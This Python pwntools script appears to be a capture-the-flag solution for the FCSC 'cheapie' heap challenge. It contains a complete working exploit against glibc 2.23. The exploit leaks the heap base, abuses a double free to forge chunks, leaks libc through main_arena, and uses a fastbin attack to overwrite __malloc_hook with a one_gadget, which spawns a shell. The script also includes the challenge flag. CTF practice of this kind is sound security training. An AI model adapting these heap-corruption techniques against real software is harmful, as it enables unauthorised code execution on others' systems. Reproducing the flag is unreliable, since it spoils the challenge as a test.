#!/usr/bin/env python3

# nc challenges2.france-cybersecurity-challenge.fr 4006

# md5sum * | grep 2.23 | grep amd64 -> we find exact libc / ld
# libc6_2.23-0ubuntu11.2_amd64.so

'''
writeups:
# https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/#zero_to_hero
# https://faraz.faith/2019-09-30-bsides-delhi-message-saver/
# https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html

on double free
# https://heap-exploitation.dhavalkapil.com/attacks/double_free
# https://ctftime.org/writeup/14625
'''

from pwn import *
import sys

def wait():
    res = r.recvuntil('>>> ')
    return res

def alloc(size, data='\n'):
    wait()
    r.sendline('1')
    r.recvuntil('Amount in bytes [16-1024]: ')
    r.sendline(str(size))
    res = r.recvuntil('\n')
    addr = int(res.split(b' ')[-1][2:], 16)
    r.recvuntil('\n')
    r.send(data)
    return addr

def free(addr):
    wait()
    r.sendline('2')
    r.recvuntil('Address to free: ')
    r.sendline(hex(addr))

def debug(addr):
    wait()
    r.sendline('3')
    r.recvuntil('Address to show (16-byte sneak peak): ')
    r.sendline(hex(addr))
    leak = int(b''.join(r.recvuntil('\n')[:-2].split(b' ')[:8][::-1]), 16)
    return leak

elf = ELF('./cheapie')
libc = ELF('./libc-2.23.so')
r = process('./cheapie')
if len(sys.argv) > 1:
    if sys.argv[1] == 'gdb':
        commands = '''
        b my_malloc
        c
        c 13
        '''
        gdb.attach(r, commands)
    elif sys.argv[1] == 'remote':
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4006)

size = 64

# leaking heap base
a = alloc(size)
log.info(f'a = {hex(a)}')
b = alloc(size)
log.info(f'b = {hex(b)}')
free(a)
free(b)
heap_base = debug(b)
log.success(f'heap_base = {hex(heap_base)}')

# creating fake small chunk
free(a) # double free
c = alloc(size, p64(heap_base + 0x10) + p64(size + 0x10 | 1)) # -> a
log.info(f'c = {hex(c)}')
d = alloc(size, p64(heap_base + 0x50) + p64(heap_base + 0x50)) # -> b
log.info(f'd = {hex(d)}')
e = alloc(size) # -> a
log.info(f'e = {hex(e)}')
f = alloc(size, p64(0) * (size // 8 - 1) + p64(0xa0)) # -> a + 0x10
log.info(f'f = {hex(f)}')
g = alloc(0x78, p64(0) * 8 + p64(0xa0) + p64(0x31))
log.info(f'g = {hex(g)}')

# leak libc
free(b)
main_arena = debug(b)
log.success(f'main_arena = {hex(main_arena)}')
libc_base = main_arena - 0x3c4b78 # offset determined with gef
log.success(f'libc_base = {hex(libc_base)}')

# addresses for ropchain
gadget = libc_base + 0xf1207 # one_gadget
malloc_hook = libc_base + libc.sym['__malloc_hook']
log.info(f'gadget = {hex(gadget)}')
log.info(f'malloc_hook = {hex(malloc_hook)}')

# ret arbitrary ptr with malloc
h = alloc(0x68)
log.info(f'h = {hex(h)}')
i = alloc(0x68)
log.info(f'i = {hex(i)}')
free(h)
free(i)
free(h)
j = alloc(0x68, p64(malloc_hook - 0x23))
log.info(f'j = {hex(j)}')
k = alloc(0x68)
log.info(f'k = {hex(k)}')
l = alloc(0x68)
log.info(f'l = {hex(l)}')
m = alloc(0x68, b'A' * 0x13 + p64(gadget))
log.info(f'm = {hex(m)}')

# trigger malloc hook
wait()
r.sendline('1')
r.recv()
r.sendline('16')

# enjoy the shell :)
r.interactive()

# FCSC{e66ad56c1e9814bb23a9e2d6c05aacae213edd6e2c2ed12d1057f3bcf897c849}
